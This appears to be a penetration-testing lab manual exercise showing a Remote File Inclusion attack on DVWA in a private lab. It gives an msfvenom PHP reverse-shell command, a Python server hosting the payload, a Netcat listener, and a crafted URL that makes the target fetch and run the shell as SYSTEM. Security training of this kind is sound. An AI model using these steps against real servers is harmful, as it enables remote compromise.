# Exercise 17: Performing a Remote File Inclusion (RFI) Attack

### Scenario

Remote File Inclusion (RFI) vulnerability occurs when a web application improperly allows external scripts or remote files to be dynamically included and executed on the backend web server without adequate input validation or sanitization.

Unlike Local File Inclusion (LFI), which restricts file loading to the local filesystem, RFI allows an attacker to supply a remote URL parameter (e.g., `http://attacker-ip:8000/shell.php`), forcing the target web server to fetch and execute arbitrary code. This frequently results in full Remote Code Execution (RCE) and system-level compromise.

In this exercise, we simulate an RFI attack against **Damn Vulnerable Web Application (DVWA)** hosted on Windows Server 2019 via WampServer, using `msfvenom` to generate a PHP reverse shell payload and `netcat` to obtain a interactive shell running as <font color="#ff4d4d"><b>nt authority\system</b></font>.

### Objective

The objective of this lab is to help students learn how to:
- Configure WampServer and DVWA on Windows Server 2019
- Set DVWA Security Level to Low to expose vulnerable file inclusion endpoints
- Generate PHP reverse shell payloads using `msfvenom`
- Host payloads using Python HTTP Server (`python3 -m http.server`)
- Catch incoming reverse shell connections with Netcat (`nc -lvp 4444`)
- Execute remote commands to verify backend system privileges (`whoami`)

## Task 1: Performing a Remote File Inclusion (RFI) Attack

In this task, we initialize WampServer on Windows Server 2019, generate a PHP reverse shell on Parrot Security using `msfvenom`, serve the payload over HTTP, trigger Remote File Inclusion on DVWA (`http://192.168.0.20:8080/dvwa/vulnerabilities/fi/`), catch the incoming connection in Netcat, and verify execution context as <font color="#ff4d4d"><b>nt authority\system</b></font>.

1. Switch to **Windows Server 2019** and log in with <font color="#ff4d4d"><b>Administrator</b></font> / <font color="#ff4d4d"><b>Pa$$w0rd</b></font>.
2. Click **Type here to search**, type <font color="#c084fc"><b>wampserver64</b></font>, and press Enter.

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/iwmdxpn0.jpg)

4. Switch to **Parrot Security**, open Firefox, and navigate to <font color="#38bdf8"><b>http://192.168.0.20:8080/dvwa</b></font>.

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/z0mxefql.jpg)

5. Log into DVWA using default credentials:
   - Username: <font color="#ff4d4d"><b>admin</b></font>
   - Password: <font color="#ff4d4d"><b>password</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/x4gbqyr5.jpg)

6. In DVWA, click **DVWA Security** from the left navigation pane, set **Security Level** to <font color="#ffd700"><b>Low</b></font>, and click **Submit**.

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/kmpuk4ox.jpg)

7. Open a terminal on Parrot Security with sudo privileges and generate a PHP reverse shell payload using `msfvenom`:
   <font color="#ffd700"><b>msfvenom -p php/reverse_php lport=4444 lhost=192.168.0.18 > shell.php</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/djxrpxvt.jpg)

8. Host the payload directory over HTTP:
   <font color="#ffd700"><b>python3 -m http.server 8000</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/lb5ddup2.jpg)

9. Return to DVWA in the browser and select **File Inclusion** from the left menu.

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/l2nqp14x.jpg)

10. Open a new terminal tab and start a Netcat listener on port 4444:
    <font color="#ffd700"><b>nc -lvp 4444</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/qlvtjaxy.jpg)

11. Trigger the Remote File Inclusion by pointing the `page` URL parameter to your hosted PHP payload:
    <font color="#38bdf8"><b>http://192.168.0.20:8080/dvwa/vulnerabilities/fi/?page=http://192.168.0.18:8000/shell.php</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/syfj4iy2.jpg)

12. Switch to your Netcat terminal tab to confirm an incoming reverse shell connection from Windows Server 2019.

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/2js3mkir.jpg)

13. In the reverse shell session, execute <font color="#ffd700"><b>whoami</b></font> to verify the user context:
    <font color="#ff4d4d"><b>nt authority\system</b></font>

![Screenshot](../Lab%20Manuals/Module%2005_%20Web%20Application%20Penetration%20Testing_files/gdaxvpk1.jpg)

14. Close both terminal windows on Parrot Security.
